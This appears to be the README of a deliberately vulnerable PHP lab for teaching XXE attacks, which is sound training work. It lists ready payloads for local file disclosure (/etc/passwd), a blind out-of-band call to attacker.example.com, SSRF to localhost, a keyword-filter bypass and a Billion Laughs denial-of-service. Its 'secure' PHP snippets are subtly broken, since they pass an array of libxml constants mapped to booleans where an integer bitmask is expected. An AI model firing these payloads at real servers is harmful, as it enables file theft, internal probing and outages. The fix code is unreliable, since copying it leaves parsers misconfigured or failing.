# XXE Vulnerability Training Lab

A comprehensive, hands-on training environment for learning XML External Entity (XXE) vulnerabilities from beginner to advanced levels.

## 🎯 Purpose

This lab is designed to help cybersecurity students and penetration testers:
- Understand what XXE vulnerabilities are
- Learn how XXE attacks work
- Practice various XXE exploitation techniques
- See how to prevent XXE vulnerabilities

## 🚀 Quick Start

### Prerequisites
- PHP 7.0 or later
- Web server (Apache or Nginx)
- Local development environment (XAMPP, WAMP, or similar)

### Installation

1. **Clone or Download the Project**
   ```bash
   git clone https://github.com/your-username/xxe-training-lab.git
   cd xxe-training-lab
   ```

2. **Set Up Web Server**
   - Copy the entire project to your web server's document root:
     - XAMPP: `C:\xampp\htdocs\`
     - WAMP: `C:\wamp\www\`
     - Linux (Apache): `/var/www/html/`

3. **Configure Permissions**
   ```bash
   # Linux/macOS
   chmod -R 755 .
   chmod 775 logs/  # For log file writing

   # Windows
   # Set write permissions on logs directory
   ```

4. **Start Web Server**
   - Start your local web server (XAMPP, WAMP, or Apache/Nginx)
   - Access the lab at: `http://localhost/xxe-training-lab/`

## 📚 Lab Levels

### Level 1 - Basic XXE
**Description:** Simple XML parsing with basic external entity support.
**Vulnerability:** Uses PHP's `simplexml_load_string()` with default settings.
**Goal:** Learn how entities work in XML.

**Example Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY hello "World">
]>
<data>
    <message>Hello &hello;!</message>
</data>
```

---

### Level 2 - Local File Disclosure
**Description:** Read sensitive files from the server.
**Vulnerability:** Allows external entity expansion with file system access.
**Goal:** Extract sensitive system files.

**Example Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<data>
    <file_content>&passwd;</file_content>
</data>
```

---

### Level 3 - Blind XXE
**Description:** XXE attacks without direct output in responses.
**Vulnerability:** Server parses XML but doesn't display results.
**Goal:** Detect XXE via out-of-band techniques.

**Example Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY ping SYSTEM "http://attacker.example.com/ping">
]>
<data>
    <content>&ping;</content>
</data>
```

---

### Level 4 - SSRF via XXE
**Description:** Server-Side Request Forgery through XXE.
**Vulnerability:** Allows access to internal network resources.
**Goal:** Probe internal services.

**Example Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY internal SYSTEM "http://127.0.0.1:80/">
]>
<data>
    <response>&internal;</response>
</data>
```

---

### Level 5 - Advanced XXE
**Description:** Parameter entities and nested entity resolution.
**Vulnerability:** Supports complex entity structures.
**Goal:** Master advanced XXE techniques.

**Example Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY % param1 "World">
    <!ENTITY % param2 "Hello %param1;">
    <!ENTITY greeting "%param2;">
]>
<data>
    <message>&greeting;</message>
</data>
```

---

### Level 6 - XXE Filter Bypass
**Description:** Basic input filtering that can be bypassed.
**Vulnerability:** Filters common XXE keywords but is not comprehensive.
**Goal:** Learn to bypass XXE filters.

**Bypass Payload (Case Encoding):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!dOcTyPe data [
    <!eNtItY xxe SyStEm "file:///etc/passwd">
]>
<data>
    <content>&xxe;</content>
</data>
```

---

### Level 7 - XXE Denial of Service
**Description:** DoS attacks using XML entity expansion.
**Vulnerability:** No limits on entity expansion.
**Goal:** Understand XXE-based DoS attacks.

**Billion Laughs Attack:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY a "1">
    <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
    <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
    <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
    <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
]>
<data>
    <content>&e;</content>
</data>
```

**⚠️ Warning:** This attack can crash servers. Use responsibly!

---

### Level 8 - Secure Implementation
**Description:** Properly configured XML parsing.
**Security:** All XXE vulnerabilities have been fixed.
**Goal:** Learn how to prevent XXE attacks.

**Key Security Measures:**
```php
$options = [
    LIBXML_NONET => true,      // Disable network access
    LIBXML_NOENT => false,     // Do not expand entities
    LIBXML_DTDLOAD => false,   // Do not load external DTD
    LIBXML_DTDVALID => false   // Do not validate against DTD
];

$simplexml = simplexml_load_string($xml, 'SimpleXMLElement', $options);
```

## 🛡️ Preventing XXE Vulnerabilities

### PHP Secure Configuration
```php
// Disable external entity loading
libxml_disable_entity_loader(true);

// Set secure parser options
$options = [
    LIBXML_NONET => true,
    LIBXML_NOENT => false,
    LIBXML_DTDLOAD => false,
    LIBXML_DTDVALID => false
];

// Always use secure parsing functions
$xml = simplexml_load_string($data, 'SimpleXMLElement', $options);
```

### General Best Practices
1. **Disable External Entities:** Always configure XML parsers to disable external entity resolution.
2. **Use Modern Parsers:** Avoid old, insecure parsing functions.
3. **Validate Input:** Implement strict XML schema validation.
4. **Limit Parser Resources:** Configure entity expansion limits.
5. **Disable Network Access:** Prevent XML parsers from accessing external resources.

## 📁 Project Structure

```
xxe-training-lab/
├── index.php              # Homepage/dashboard
├── css/
│   └── style.css          # Stylesheet
├── includes/
│   ├── header.php         # Header and navigation
│   └── footer.php         # Footer
├── labs/
│   ├── level1.php         # Basic XXE
│   ├── level2.php         # Local File Disclosure
│   ├── level3.php         # Blind XXE
│   ├── level4.php         # SSRF via XXE
│   ├── level5.php         # Advanced XXE
│   ├── level6.php         # XXE Filter Bypass
│   ├── level7.php         # XXE DoS
│   └── level8.php         # Secure Implementation
└── logs/                  # Log directory for Blind XXE
```

## 📝 Notes

- **Intentionally Vulnerable:** This lab is designed to be vulnerable for educational purposes.
- **Testing Environment:** Only use this lab on your own systems or with explicit permission.
- **Security Warning:** Do not deploy this on production servers.
- **Responsible Use:** Always follow ethical hacking guidelines.

## 📚 Resources

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger XXE Guide](https://portswigger.net/web-security/xxe)
- [PHP XML Security](https://www.php.net/manual/en/ref.libxml.php)

## 🐛 Issues & Feedback

Please report any issues or provide feedback through the project's issue tracker.

## 📄 License

This project is for educational purposes only. Use at your own risk.
